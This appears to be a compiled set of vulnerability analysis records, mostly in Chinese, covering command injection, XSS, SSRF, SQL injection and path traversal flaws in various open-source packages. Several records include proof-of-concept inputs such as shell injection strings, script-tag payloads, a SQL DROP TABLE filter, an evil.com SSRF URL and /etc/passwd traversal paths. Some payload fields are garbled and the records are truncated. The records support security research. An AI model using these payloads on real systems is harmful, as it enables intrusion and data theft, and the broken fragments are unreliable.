basic_info.title: Command Injection in index.ts
basic_info.description:
在src/utils/validation.ts的resolveCommandPath函数中，用户输入的command参数未经任何验证或转义直接拼接到shell命令字符串中，导致命令注入漏洞。攻击者可以通过注入特殊字符（如引号、分号、管道符等）执行任意系统命令。根据CVE公告(CVE-2025-11202)，这是一个CVSS 9.8分的严重漏洞，允许远程攻击者在无需认证的情况下执行任意代码。

Impact: 代码库中存在高危命令注入漏洞，CVSS 9.8分（严重）。潜在影响：1. 如果resolveCommandPath被调用，攻击者可执行任意系统命令，导致完全服务器控制；2. 敏感数据泄露（/etc/passwd、配置文件、数据库凭证等）；3. 内网横向移动；4. 持久化后门安装。当前版本未调用漏洞函数，但存在以下风险：代码演进可能引入调用、第三方代码可能导入使用、静态分析工具会报告此漏洞。

evidence.analysis: 1. 漏洞代码确认：src/utils/validation.ts第9行使用child_process.execSync(`which ${command}`)直接拼接用户输入，存在明确的命令注入漏洞；2. 动态漏洞验证：编写JavaScript Fuzzing Harness测试8类payload（;、|、&、`、$()、>、<、\n等），全部成功触发命令注入；3. 调用链深度分析：搜索整个项目（17个文件），使用多种搜索模式未找到resolveCommandPath函数的调用点；4. 工具接口审计：检查index.ts中所有5个工具接口（execute_command、get_command_history、ssh_execute、ssh_disconnect、ssh_list_connections），均未调用resolveCommandPath；5. 导入关系验证：检查所有import语句，未发现validation.ts被导入；6. 结论：漏洞真实存在于代码库中，符合CVE-2025-11202描述，但当前版本未调用此漏洞函数，因此不是直接可远程利用的漏洞。
evidence.method: 多维度安全验证：静态代码分析 + 动态Fuzzing测试 + 完整调用链审计 + 项目范围搜索

poc.description: resolveCommandPath函数存在命令注入漏洞，如果被导入和调用可导致远程代码执行
steps: 1. 导入resolveCommandPath函数：import { resolveCommandPath } from './src/utils/validation'
2. 调用函数并传入恶意command参数：resolveCommandPath('ls; id')
3. 函数内部执行：child_process.execSync(`which ls; id`)
4. 系统执行两个命令：which ls 和 id
5. id命令输出当前用户信息，证明命令注入成功
poc.payload:
import { resolveCommandPath } from './src/utils/validation';
await resolveCommandPath('ls; id; echo "CVE-2025-11202 Exploited" > /tmp/poc.txt');

cve_info.Title: win-cli-mcp-server resolveCommandPath Command Injection Remote Code Execution Vulnerability
cve_info.Description:
win-cli-mcp-server resolveCommandPath Command Injection Remote Code Execution Vulnerability. This vulnerability allows remote attackers to execute arbitrary code on affected installations of win-cli-mcp-server. Authentication is not required to exploit this vulnerability.

The specific flaw exists within the implementation of the resolveCommandPath method. The issue results from the lack of proper validation of a user-supplied string before using it to execute a system call. An attacker can leverage this vulnerability to execute code in the context of the service account. Was ZDI-CAN-27787.

CWE.Description: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

PatchInfo.Message:
security: remove unused resolveCommandPath function with command
injection vulnerability

- Remove resolveCommandPath() function from src/utils/validation.ts
- Function contained command injection vulnerability (ZDI-CAN-27787)
- Was never used in production codebase throughout project history
- Eliminates attack surface by removing unused vulnerable code entirely
- Remove associated test coverage and dependencies

basic_info.title: Xss in create.js
basic_info.description:
The logInfo and logError functions in create.js directly concatenate user-controlled text into HTML without using AngularJS's $sanitize service. This allows cross-site scripting attacks when malicious content is passed to these functions.

Impact: 攻击者可以通过注入恶意JavaScript代码，在管理员查看创建日志时执行任意代码，可能导致会话劫持、管理员权限提升或数据泄露。

cve_info.Title: sequentech admin-console Election Description cross site scripting
cve_info.Description: A vulnerability was found in sequentech admin-console up to 6.1.7 and classified as problematic. Affected by this issue is some unknown functionality of the component Election Description Handler. The manipulation leads to cross site scripting. The attack may be launched remotely. Upgrading to version 7.0.0-beta.1 is able to address this issue. The patch is identified as 0043a6b1e6e0f5abc9557e73f9ffc524fc5d609d. It is recommended to upgrade the affected component. VDB-258782 is the identifier assigned to this vulnerability.

CWE.Description: CWE-79 Cross Site Scripting

PatchInfo.Message:
Fix some XSS (#292) (#293)

There was an issue with election description. During election creation,
we relied in ng-bind-html to sanitize the visualization of election
description before being sanitized by the backend (because it has not
yet been sent to the backend), but apparently it doesn't work for some
xss. The same issue happened in election list when showing the
description of the drafti election.

With this change, we always show the election description as plain text
so that we don't need to sanitize it. Also see related issue with
htmlToText in common-ui: https://github.com/sequentech/common-ui/pull/221
because sometimes we also called to our own htmlToText angular filter,
and sanitization was also needed to happen there.

Another fix is to use $sanitize more pervasively in the election
creation screen, so that any reply from the server is also not trusted
and properly sanitized.

basic_info.title: Iframe Injection in lightbox.js
basic_info.description:
Elementor Website Builder WordPress插件在3.5.5版本之前存在iframe注入漏洞。攻击者可以通过控制HTML元素的data-elementor-lightbox属性，注入任意URL作为lightbox iframe的src属性。该漏洞源于用户控制的URL在传递给iframe src属性前未经过充分验证和过滤。虽然代码检查了URL是否以'http'开头，但未验证URL内容是否属于允许的视频平台（YouTube/Vimeo）或进行其他安全检查。

Impact: 攻击者可在网站lightbox中加载任意恶意网页，导致：1) 钓鱼攻击 - 伪造登录页面窃取凭证；2) XSS攻击 - 通过恶意iframe执行脚本；3) 恶意软件分发 - 加载包含漏洞利用的页面；4) 点击劫持 - 透明iframe覆盖界面。由于lightbox通常用于显示用户信任的内容，此漏洞可能被用于高成功率的社会工程攻击。

findings.title: Iframe Injection in lightbox.js
findings.description:
Elementor Website Builder WordPress插件在3.5.5版本之前存在iframe注入漏洞。攻击者可以通过控制HTML元素的data-elementor-lightbox属性，注入任意URL作为lightbox iframe的src属性。该漏洞源于用户控制的URL在传递给iframe src属性前未经过充分验证和过滤。虽然代码检查了URL是否以'http'开头，但未验证URL内容是否属于允许的视频平台（YouTube/Vimeo）或进行其他安全检查。

Impact: 攻击者可在网站lightbox中加载任意恶意网页，导致：1) 钓鱼攻击 - 伪造登录页面窃取凭证；2) XSS攻击 - 通过恶意iframe执行脚本；3) 恶意软件分发 - 加载包含漏洞利用的页面；4) 点击劫持 - 透明iframe覆盖界面。由于lightbox通常用于显示用户信任的内容，此漏洞可能被用于高成功率的社会工程攻击。

Nodes.Desc: 源点：变量 `lightboxData` 通过 `parse()` 接收外部输入并成为污点源。代码: `if ( element.dataset.elementorLightbox ) { lightboxData = JSON.parse( element.dataset.elementorLightbox ); }`
传播点：数据在 `showModal()` 调用链中继续传递/变换。代码: `if ( lightboxData.type && 'slideshow' !== lightboxData.type ) { this.showModal( lightboxData );`
传播点：数据在 `function()` 调用链中继续传递/变换。代码: `showModal: function( options ) { if ( options.url && ! options.url.startsWith( 'http' ) ) { return; }`
传播点：数据在 `setVideoContent()` 调用链中继续传递/变换。代码: `switch ( options.type ) { case 'video': self.setVideoContent( options );`
传播点：`hosted` 经 `extend()` 处理后并入 `$videoElement`，污点继续向下游传播。 代码: `if ( 'hosted' === options.videoType ) { const videoParams = $.extend( { src: options.url, autoplay: '' }, options.videoP...`
汇点：调用 `getAutoplayURL(videoURL)` 触发危险操作，污点参数被消费（结果写入 `autoplay`）。 代码: `getAutoplayURL( videoURL ) { return videoURL.replace( '&autoplay=0', '' ) + '&autoplay=1'; }`

evidence.method: 动态代码分析 + Fuzzing Harness测试

basic_info.title: Xss in template-generator.js
basic_info.description:
The renderIssue function passes message.message directly to the issueTemplate without HTML escaping. When the template renders this value using <%= message %>, malicious content in ESLint error messages can execute JavaScript

Impact: 攻击者可以通过注入恶意ESLint错误消息（例如通过污染源代码或修改ESLint配置）在代码质量报告页面执行任意JavaScript代码，可能导致会话劫持、数据窃取或进一步攻击。

cve_info.Title: mportuga eslint-detailed-reporter template-generator.js renderIssue cross site scripting
cve_info.Description: A vulnerability was found in mportuga eslint-detailed-reporter up to 0.9.0 and classified as problematic. Affected by this issue is the function renderIssue in the library lib/template-generator.js. The manipulation of the argument message leads to cross site scripting. The attack may be launched remotely. The patch is identified as 505c190efd4905990db6207863bdcbd9b1d7e1bd. It is recommended to apply a patch to fix this issue. VDB-226310 is the identifier assigned to this vulnerability.

CWE.Description: CWE-79 Cross Site Scripting

PatchInfo.Message:
fix(template-generator): fix xss problem in issue message

- use `_.escape` for html escape instead of `formatSourceCode`
- escape issue message when rendering issues\
   e.g. rule 'vue/no-lone-template' produces
   message '`<template>` require directive.'

basic_info.title: Xss in Link.ts
basic_info.description:
在4个markdown解析器文件（Link.ts、Bold.ts、BoldEmphasis.ts、Emphasis.ts）中，marked()函数调用时缺少PlainText解析器。PlainText解析器使用escape()函数对内容进行HTML转义，缺少它会导致用户输入的HTML特殊字符（如<, >, &, ", '）不被转义，从而造成存储型XSS漏洞。攻击者可以构造恶意markdown内容，当其他用户查看时执行任意JavaScript代码。

Impact: 存储型跨站脚本攻击（XSS）。攻击者可以构造恶意markdown内容，当其他用户查看时执行任意JavaScript代码，可能导致：1. 窃取用户会话cookie 2. 重定向到恶意网站 3. 执行未经授权的操作 4. 窃取敏感信息 5. 传播恶意软件。由于是存储型XSS，影响范围更广，所有查看受影响内容的用户都会受到影响。

evidence.analysis:
1. 读取Link.ts文件，确认第20行marked函数调用缺少PlainText解析器
2. 读取Bold.ts、BoldEmphasis.ts、Emphasis.ts文件，确认存在相同问题
3. 读取PlainText.ts文件，确认其使用escape()函数进行HTML转义
4. 读取marked/index.ts文件，确认当没有解析器匹配时直接返回原始字符串（第54行）
5. 分析数据流：用户输入 -> matchResult[1] -> marked函数（缺少PlainText） -> 未转义输出 -> HTML插入

cve_info.Title: Cross-site Scripting (XSS) - Stored in usememos/memos
cve_info.Description: Cross-site Scripting (XSS) - Stored in GitHub repository usememos/memos prior to 0.9.1.

CWE.Description: CWE-79 Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

PatchInfo.Message:
chore: fix XSS in renderer (#875)

chore: fix xss in renderer

basic_info.title: Xss in index.ts
basic_info.description:
在web/src/labs/marked/index.ts的marked函数中，当解析内联元素时，prefixStr（匹配元素之前的内容）没有经过marked()函数处理，直接拼接到输出HTML中。攻击者可以在markdown中输入恶意脚本代码，这些代码位于内联元素之前，作为prefixStr被直接输出到HTML中，导致存储型XSS漏洞。此外，parser文件中的转义处理不一致：Bold.ts、Emphasis.ts、BoldEmphasis.ts使用了escape()，但Strikethrough.ts没有使用escape()。

Impact: 攻击者可以注入恶意JavaScript代码，当其他用户查看包含恶意markdown的内容时，代码会在受害者浏览器中执行。可能导致：1) 窃取用户会话cookie和身份验证令牌；2) 重定向到恶意网站；3) 执行任意操作（如发布内容、修改设置）；4) 窃取敏感数据。由于是存储型XSS，影响范围广，所有查看受影响内容的用户都会受到攻击。

findings.title: Xss in index.ts
findings.description:
在web/src/labs/marked/index.ts的marked函数中，当解析内联元素时，prefixStr（匹配元素之前的内容）没有经过marked()函数处理，直接拼接到输出HTML中。攻击者可以在markdown中输入恶意脚本代码，这些代码位于内联元素之前，作为prefixStr被直接输出到HTML中，导致存储型XSS漏洞。此外，parser文件中的转义处理不一致：Bold.ts、Emphasis.ts、BoldEmphasis.ts使用了escape()，但Strikethrough.ts没有使用escape()。

Impact: 攻击者可以注入恶意JavaScript代码，当其他用户查看包含恶意markdown的内容时，代码会在受害者浏览器中执行。可能导致：1) 窃取用户会话cookie和身份验证令牌；2) 重定向到恶意网站；3) 执行任意操作（如发布内容、修改设置）；4) 窃取敏感数据。由于是存储型XSS，影响范围广，所有查看受影响内容的用户都会受到攻击。

Nodes.Desc: 源点：变量 `marked` 在此接收可控数据并进入污点传播链。代码: `export const marked = (markdownStr: string, blockParsers = blockElementParserList, inlineParsers = inlineElementParserLi...`
Nodes.code: export const marked = (markdownStr: string, blockParsers = blockElementParserList, inlineParsers = inlineElementParserList): string => {

Nodes.Desc: 传播点：`const` 经 `slice()` 处理后并入 `prefixStr`，污点继续向下游传播。 代码: `const prefixStr = markdownStr.slice(0, matchedIndex); const suffixStr = markdownStr.slice(matchedIndex + matchedLength);...`

汇点：调用 `highlightWithWord(marked)` 触发危险操作，污点参数被消费（结果写入 `dangerouslySetInnerHTML`）。 代码: `dangerouslySetInnerHTML={{ __html: highlightWithWord(marked(state.expandButtonStatus === 0 ? foldedContent : content), h...`

source_to_sink_claim.reason: verifier supports a path that was already validated during mainflow submission

evidence.analysis:
1. 读取web/src/labs/marked/index.ts文件，分析marked函数逻辑。发现第48-50行中，prefixStr直接拼接返回，没有经过marked()递归处理。
2. 检查parser文件，发现转义处理不一致：Bold.ts、Emphasis.ts使用escape()，但Strikethrough.ts没有使用escape()。
3. 分析inlineElementParserList顺序，PlainText parser在最后，且当其他parser匹配时会跳过PlainText。
4. 搜索marked函数使用位置，发现在web/src/components/MemoContent.tsx中通过dangerouslySetInnerHTML插入到DOM。
5. 攻击场景：用户输入'<script>alert(1)</script>**bold**'，prefixStr='<script>alert(1)</script>'直接返回，插入DOM后执行脚本。
evidence.method: 静态代码分析和数据流追踪。通过读取源代码文件，分析marked函数的逻辑，发现prefixStr直接拼接未处理。追踪数据流从用户输入到dangerouslySetInnerHTML，确认完整的攻击路径。

poc.description: 攻击者可以在markdown内容中插入XSS payload，放在任何markdown元素之前。例如：'<script>alert("XSS")</script>**bold text**'。当marked函数处理时，prefixStr='<script>alert("XSS")</script>'直接返回，没有转义。输出通过dangerouslySetInnerHTML插入DOM，执行JavaScript。
steps: 1. 攻击者提交markdown内容：'<script>alert(document.domain)</script>**重要通知**'
2. marked函数处理：匹配**重要通知**作为bold元素，prefixStr='<script>alert(document.domain)</script>'
3. prefixStr直接拼接返回，输出：'重要通知'
4. 输出通过MemoContent组件的dangerouslySetInnerHTML插入到DOM中
5. 浏览器执行<script>标签中的JavaScript代码，弹出当前域名
poc.payload: **bold text** 或者使用其他XSS向量： **emphasis***

basic_info.title: Xss in media.js
basic_info.description:
The indexFile function in static/js/media.js retrieves filename from .filename element text without sanitization and directly concatenates it into HTML that is set via jQuery's html() method. This allows attackers to inject malicious scripts.

Impact: 攻击者可以执行任意 JavaScript 代码，窃取用户会话、重定向用户、修改页面内容等。由于这是管理界面功能，可能导致管理员账户被劫持。

findings.title: Xss in media.js
findings.description:
The indexFile function in static/js/media.js retrieves filename from .filename element text without sanitization and directly concatenates it into HTML that is set via jQuery's html() method. This allows attackers to inject malicious scripts.

Impact: 攻击者可以执行任意 JavaScript 代码，窃取用户会话、重定向用户、修改页面内容等。由于这是管理界面功能，可能导致管理员账户被劫持。

Nodes.Desc: 源点：变量 `filename` 通过 `find()` 接收外部输入并成为污点源。代码: `filename = $row.find('.filename').text()`

传播点：`dialog` 经 `find()` 处理后并入 `class`，污点继续向下游传播。 代码: `dialog.find(".modal-body").html('

Indexing ' + filename + '

');`

汇点：调用 `find(modal)` 触发危险操作，污点参数被消费（结果写入 `class`）。 代码: `dialog.find(".modal-body").html('

Indexing ' + filename + '

');`

传播点：数据在 `find()` 调用链中继续传递/变换。代码: `dialog.find(".modal-body").html('

Indexing ' + filename + ' complete

');`

汇点：调用 `find(modal)` 触发危险操作，污点在此触达危险 API。代码: `dialog.find(".modal-body").html('

Indexing ' + filename + ' complete

');`

source_to_sink_claim.reason: verifier supports a path that was already validated during mainflow submission

evidence.analysis: 验证了 indexFile 函数的完整代码。filename 变量在行153从 .filename 元素文本获取，在行160和171直接拼接进 HTML 字符串中，通过 .html() 方法设置到 DOM。攻击者可以控制 .filename 元素的文本内容来注入恶意脚本。代码中没有对 filename 进行 HTML 编码或过滤。
evidence.method: 静态代码分析结合上下文验证。通过 read_file 读取文件内容，确认 filename 变量从 .filename 元素文本获取，并直接拼接进 HTML 字符串中，通过 jQuery 的 html() 方法设置到 DOM，没有进行任何 HTML 编码或过滤。

poc.description: 攻击者可以控制 .filename 元素的文本内容，注入恶意脚本。当用户点击触发 indexFile 函数时，恶意脚本会被执行。
steps: 1. 找到一个包含 .filename 类元素的表格行
2. 修改 .filename 元素的文本内容为恶意 payload，如：test'>
3. 触发 indexFile 函数（通常通过点击索引按钮）
4. 恶意脚本会在对话框的 .modal-body 中执行

basic_info.description:
Graphite Web的template视图函数存在XSS漏洞。攻击者可以通过恶意构造的模板名称参数注入JavaScript代码。当模板不存在时，name参数被直接拼接到错误消息中，并通过有缺陷的htmlEncode函数处理后在浏览器中显示。htmlEncode函数使用正则表达式/[^a-zA-Z0-9 ]/g，只替换非字母数字字符为HTML实体，空格字符未被处理，可能导致XSS绕过。根据补丁信息，修复需要添加.replace(/\s/

Impact: 攻击者可以通过恶意构造的模板名称执行任意JavaScript代码，可能导致会话劫持、敏感信息窃取、页面篡改等。由于模板名称来自URL路径，攻击可以通过诱使用户点击恶意链接实现。

source_to_sink_claim.reason: verifier supports a path that was already validated during mainflow submission

evidence.analysis:
1. 读取并分析了webapp/graphite/dashboard/views.py中的template函数，确认第198行将用户控制的name参数直接拼接到错误消息中。
2. 读取并分析了webapp/graphite/dashboard/urls.py，确认name参数来自URL路径，正则表达式[^/]+允许任意字符（除斜杠外）。
3. 读取并分析了webapp/content/js/dashboard.js中的htmlEncode函数，确认其使用有缺陷的正则表达式/[^a-zA-Z0-9 ]/g，该表达式不编码空格字符，并将其他非字母数字字符转换为HTML数字实体。
4. 分析了Ext.Msg.alert的行为（基于ExtJS文档），确认其默认将消息作为HTML渲染，这意味着HTML数字实体会被浏览器解码。
5. 编写了JavaScript测试代码验证htmlEncode函数的输出，确认XSS payload如<script>alert(1)</script>会被转换为<script>alert(1)</script>，这些实体在HTML上下文中会被解码还原。
evidence.method: 静态代码分析结合动态测试模拟。验证了完整的污点传播路径：从URL路由获取用户输入的name参数，到Django视图中的字符串拼接，再到前端JavaScript的有缺陷编码函数。通过代码分析确认htmlEncode函数使用有缺陷的正则表达式，且Ext.Msg.alert默认将消息作为HTML渲染，导致HTML实体被浏览器解码。

poc.description: 攻击者可以访问不存在的模板URL，在模板名称参数中注入XSS payload。当模板不存在时，错误消息会显示并触发XSS。
steps: 1. 构造恶意URL：http://target.com/dashboard/<script>alert(1)</script>/testkey
2. 由于模板'<script>alert(1)</script>'不存在，服务器返回错误消息："Template '<script>alert(1)</script>' does not exist."
3. 前端JavaScript接收到initialError，通过htmlEncode函数处理：转换为"Template '<script>alert(1)</script>' does not exist."
4. Ext.Msg.alert显示错误消息，将HTML实体解码，导致<script>alert(1)</script>被执行。

basic_info.title: Xss in MemoContent.tsx
basic_info.description:
在memos应用中发现多个存储型XSS漏洞，影响0.9.0之前版本。用户输入的markdown内容在解析和高亮过程中未进行HTML转义，最终通过dangerouslySetInnerHTML渲染到页面，导致跨站脚本攻击。漏洞存在于：1) markdown解析器（Bold.ts、BoldEmphasis.ts、Emphasis.ts、Link.ts）将未转义的matchResult[1]传递给marked()函数；2) 高亮器（index.ts）直接使用innerHTML处理HTML内容

Impact: 高危 - 存储型跨站脚本攻击。攻击者可以注入恶意JavaScript代码，当其他用户查看包含恶意内容的memo时，代码会在受害者浏览器中执行。可能导致：1) 窃取用户会话cookie和身份凭证；2) 执行任意操作（如删除memo、修改设置）；3) 窃取敏感数据；4) 重定向到恶意网站。

basic_info.title: Xss in dwz.min.js
basic_info.description:
在 initLink 函数中，title 变量通过 $this.html() 获取用户控制的 HTML 内容，未经过滤直接传递给 $.pdialog.open 函数。在 pdialog.open 函数中，title 参数被直接传递给 .html() 方法（第2995行和3021行），导致跨站脚本攻击。攻击者可以构造恶意链接，当用户点击时执行任意 JavaScript 代码。

Impact: 攻击者可以构造恶意链接，当用户点击时在对话框中执行任意JavaScript代码，可能导致会话劫持、敏感信息窃取、恶意操作等。对话框通常用于重要操作，增加了攻击的危害性。

basic_info.title: Ssrf in index.js
basic_info.description:
当应用程序将用户输入传递到undici.request的opts.path选项时，存在SSRF漏洞。攻击者可以提供一个绝对URL（如http://evil.com）作为opts.path，该URL会被new URL()解析为目标主机，而不是相对于提供的base URL。这允许攻击者强制应用程序向任意主机发送请求，可能导致内部服务探测、数据泄露或与其他漏洞结合使用。

Impact: 高危 - 攻击者可以：1) 探测内部网络服务，2) 访问云元数据服务获取凭证，3) 攻击localhost服务，4) 作为跳板攻击其他内部系统，5) 与XSS等漏洞结合造成更大危害。

evidence.analysis: 编写了JavaScript Fuzzing Harness模拟makeDispatcher函数行为，测试了8种不同输入场景。确认当opts.path为绝对URL（如http://evil.com/、http://192.168.1.1/admin、http://169.254.169.254/latest/meta-data/）时，URL构造函数会忽略base参数，允许请求任意主机。6个恶意测试用例全部成功触发SSRF条件。
evidence.method: Fuzzing Harness动态验证 + 代码静态分析

poc.description: 攻击者可以通过控制opts.path参数提供绝对URL，绕过base URL限制，强制应用程序向任意主机发送HTTP请求

由于opts.path是绝对URL，util.parseOrigin(url)返回的base URL被忽略

cve_info.Title: `undici.request` vulnerable to SSRF using absolute URL on `pathname`
cve_info.Description: undici is an HTTP/1.1 client, written from scratch for Node.js.`undici` is vulnerable to SSRF (Server-side Request Forgery) when an application takes in **user input** into the `path/pathname` option of `undici.request`. If a user specifies a URL such as `http://127.0.0.1` or `//127.0.0.1` ```js const undici = require("undici") undici.request({origin: "http://example.com", pathname: "//127.0.0.1"}) ``` Instead of processing the request as `http://example.org//127.0.0.1` (or `http://example.org/http://127.0.0.1` when `http://127.0.0.1 is used`), it actually processes the request as `http://127.0.0.1/` and sends it to `http://127.0.0.1`. If a developer passes in user input into `path` parameter of `undici.request`, it can result in an _SSRF_ as they will assume that the hostname cannot change, when in actual fact it can change because the specified path parameter is combined with the base URL. This issue was fixed in `undici@5.8.1`. The best workaround is to validate user input before passing it to the `undici.request` call.

CWE.Description: CWE-918: Server-Side Request Forgery (SSRF)

PatchInfo.Message: Merge pull request from GHSA-8qr4-xgw6-wmr3

basic_info.title: Sql Injection in postgresql.js
basic_info.description:
The contains operator in PostgreSQL connector's buildExpression function directly interpolates user-controlled array values into SQL query using template literals without proper escaping. When a user passes a contains filter with array values containing single quotes, it leads to SQL injection.

Impact: 攻击者可以通过 contains 操作符注入恶意 SQL 代码，可能导致：1) 数据泄露（读取敏感数据），2) 数据篡改（修改/删除数据），3) 数据库结构破坏（删除表），4) 潜在的远程代码执行（如果数据库配置允许）。该漏洞影响使用 PostgreSQL connector 的 LoopBack 应用，特别是那些使用数组类型字段和 contains 操作符的查询。

evidence.analysis: Created a test harness that simulates the PostgreSQL connector's buildExpression function and toColumnValue function. Tested with malicious array values containing single quotes. The harness demonstrated that single quotes are not escaped when interpolating array values in the contains operator, leading to SQL injection. Test cases included: 1) Normal array values, 2) Array with single quotes triggering SQL injection, 3) SQL injection payload demonstrating query manipulation.
evidence.method: Dynamic verification using Fuzzing Harness that simulates the vulnerable code path

steps: User passes a where filter with contains operator: {tags: {contains: ["test'", "value' OR '1'='1", "'); DROP TABLE users; --"]}}

When property has dataType 'varchar[]', raw array is returned
buildExpression interpolates values using template literals: `'${v}'`

cve_info.Title: loopback-connector-postgresql Vulnerable to Improper Sanitization of `contains` Filter
cve_info.Description: Improper input validation on the `contains` LoopBack filter may allow for arbitrary SQL injection. When the extended filter property `contains` is permitted to be interpreted by the Postgres connector, it is possible to inject arbitrary SQL which may affect the confidentiality and integrity of data stored on the connected database. A patch was released in version 5.5.1. This affects users who does any of the following: - Connect to the database via the DataSource with `allowExtendedProperties: true` setting OR - Uses the connector's CRUD methods directly OR - Uses the connector's other methods to interpret the LoopBack filter. Users who are unable to upgrade should do the following if applicable: - Remove `allowExtendedProperties: true` DataSource setting - Add `allowExtendedProperties: false` DataSource setting - When passing directly to the connector functions, manually sanitize the user input for the `contains` LoopBack filter beforehand.

CWE.Description: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

PatchInfo.Message:
fix: improve filter sanitisation

Add sanitisation of user-input for `contains` LoopBack filter which may allow for arbitrary SQL injection.

Signed-off-by: Rifa Achrinza <25147899+achrinza@users.noreply.github.com>

basic_info.title: Command Injection in bin.js
basic_info.description:
The getLockfile function in getLockfile.js contains a command injection vulnerability where user-controlled date and only parameters are directly concatenated into an exec() command string without proper sanitization.

Impact: Remote command execution with the privileges of the application. An attacker can execute arbitrary commands on the server by providing malicious date parameter with $(command) syntax.

basic_info.title: Xss in recently-viewed-projects.js
basic_info.description:
The feature displays recently viewed Scratch projects by fetching data from the Scratch API and rendering it using innerHTML. The project title (data[project]['title']) from the API response is directly inserted into innerHTML without proper escaping, leading to DOM-based XSS.

Impact: 攻击者可以执行任意JavaScript代码，包括：1. 窃取用户会话cookie 2. 重定向到恶意网站 3. 修改页面内容 4. 发起CSRF攻击 5. 窃取敏感信息。由于该功能在Scratch主站中，影响范围较大。

cve_info.Title: Cross site scripting vulnerability in ScratchTools
cve_info.Description: ScratchTools is a web extension designed to make interacting with the Scratch programming language community (Scratching) easier. In affected versions anybody who uses the Recently Viewed Projects feature is vulnerable to having their account taken over if they view a project that tries to. The issue is that if a user visits a project that includes Javascript in the title, then when the Recently Viewed Projects feature displays it, it could run the Javascript. This issue has been addressed in the 2.5.2 release. Users having issues scratching should open an issue in the project issue tracker https://github.com/STForScratch/ScratchTools/

CWE.Description: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

PatchInfo.Message:
Merge pull request #55 from STForScratch/fix-project-recently-viewed-security-issue

Fix Security Bug with Recently Viewed Projects

basic_info.title: Ssrf in index.js
basic_info.description:
The parseUrl function in lib/index.js incorrectly interprets file:// URLs that match a Git SSH pattern as SSH URLs, allowing an attacker to control the parsed.resource field. When the parsed result is used to make network requests, this can lead to Server-Side Request Forgery (SSRF).

Impact: 攻击者可以通过构造恶意file:// URL来控制parsed.resource字段。如果解析结果被用于发起网络请求（如SSH连接、HTTP请求等），可能导致服务器端请求伪造（SSRF），使攻击者能够：1. 访问内部网络资源；2. 扫描内部网络；3. 攻击内部服务；4. 绕过防火墙限制。

findings.title: Ssrf in index.js
findings.description:
The parseUrl function in lib/index.js incorrectly interprets file:// URLs that match a Git SSH pattern as SSH URLs, allowing an attacker to control the parsed.resource field. When the parsed result is used to make network requests, this can lead to Server-Side Request Forgery (SSRF).

Impact: 攻击者可以通过构造恶意file:// URL来控制parsed.resource字段。如果解析结果被用于发起网络请求（如SSH连接、HTTP请求等），可能导致服务器端请求伪造（SSRF），使攻击者能够：1. 访问内部网络资源；2. 扫描内部网络；3. 攻击内部服务；4. 绕过防火墙限制。

Nodes.Desc: 源点：变量 `parseUrl` 在此接收可控数据并进入污点传播链。代码: `const parseUrl = (url, normalize = false) => {`
传播点：`normalizeUrl` 经 `normalizeUrl()` 处理后并入 `url`，污点继续向下游传播。 代码: `url = normalizeUrl(url, normalize)`
传播点：`const` 经 `parsePath()` 处理后并入 `parsed`，污点继续向下游传播。 代码: `const parsed = parsePath(url)`
汇点：调用 `match(GIT_RE)` 触发危险操作，污点参数被消费（结果写入 `matched`）。 代码: `if (parsed.protocol === "file") { const matched = parsed.href.match(GIT_RE) if (matched) { parsed.protocols = ["ssh"] pa...`

source_to_sink_claim.reason: verifier supports a path that was already validated during mainflow submission

evidence.analysis: 1. 读取并分析了lib/index.js文件中parseUrl函数的完整实现。2. 确认了GIT_RE正则表达式的模式：匹配以'git@'或'http(s)://'开头的URL。3. 分析了漏洞逻辑：当parsed.protocol为'file'时，代码检查parsed.href是否匹配GIT_RE，如果匹配则将协议改为'ssh'，并将parsed.resource设置为matched[4]。4. 确认攻击者可以构造恶意file:// URL（如file://git@evil.com/path/to/repo.git）来控制resource字段。5. 如果解析结果被用于网络请求，可能导致SSRF。
evidence.method: 静态代码分析结合逻辑推理。通过分析parseUrl函数的实现，确认当file:// URL的href部分匹配GIT_RE正则表达式时，会被错误地解释为SSH URL，攻击者可以控制parsed.resource字段。

poc.description: 构造恶意file:// URL使其被错误解释为SSH URL，控制resource字段
steps: 1. 调用parseUrl函数，传入恶意file:// URL：file://git@evil.com/path/to/repo.git
2. parse-path库将URL解析为protocol: 'file', href: 'file://git@evil.com/path/to/repo.git'
3. 由于href包含'git@evil.com'，匹配GIT_RE正则表达式
4. 代码将协议改为'ssh'，resource改为'evil.com'
5. 解析结果中的resource字段被攻击者控制，可能被用于SSH连接或其他网络请求

basic_info.title: Path Traversal in routes.js
basic_info.description:
在Planka的附件缩略图下载功能中，用户可以通过filename参数进行路径遍历攻击，读取服务器上的任意文件。攻击者可以构造如`../../../etc/passwd`或`../../../proc/self/environ`的恶意文件名参数，读取敏感配置文件、数据库凭证或系统文件。该漏洞对应CVE-2022-2653，已在1.5.1版本中修复，修复方式是将filename参数硬编码为'cover-256.jpg'。

Impact: 攻击者可通过认证后，利用filename参数读取服务器上的任意文件，包括：1. 系统敏感文件（/etc/passwd, /etc/shadow）；2. 应用程序配置文件（包含数据库凭证）；3. 源代码文件；4. 进程环境信息（/proc/self/environ）。

basic_info.title: Xss in editor.js
basic_info.description:
jsuites包在5.0.1版本前的Editor()函数存在XSS漏洞，由于用户输入清理不当。攻击者可以通过多种方式注入恶意脚本：1) 通过options.value参数直接注入HTML；2) 通过远程URL加载恶意HTML；3) 通过粘贴功能注入包含恶意属性值的HTML。parse函数在处理DOM元素属性时只移除无效属性，但未对属性值进行HTML编码，导致属性值中的<字符可能被浏览器解析为HTML标签的开始。

Impact: 攻击者可以注入任意JavaScript代码，导致完全控制受影响页面，窃取用户会话、重定向到恶意网站、执行恶意操作等。

Nodes.Desc: 源点：通过 `hasOwnProperty()` 读取外部输入，污点从此进入。代码: `if (options && options.hasOwnProperty(property)) { obj.options[property] = options[property]; } else { obj.options[prope...`
汇点：污点数据在此进入危险执行路径。代码: `if (obj.options.value) { obj.editor.innerHTML = obj.options.value;`

basic_info.title: Path Traversal in index.js
basic_info.description:
The glance package before version 3.0.9 is vulnerable to directory traversal attacks that allow users to read files outside the public root directory. The vulnerability exists due to two issues: 1) Using path.normalize()

Impact: 攻击者可以读取服务器文件系统中的任意文件，包括敏感文件如 /etc/passwd、配置文件、源代码等。当服务器以高权限运行时，影响更为严重。

findings.title: Path Traversal in index.js
findings.description:
The glance package before version 3.0.9 is vulnerable to directory traversal attacks that allow users to read files outside the public root directory. The vulnerability exists due to two issues: 1) Using path.normalize()

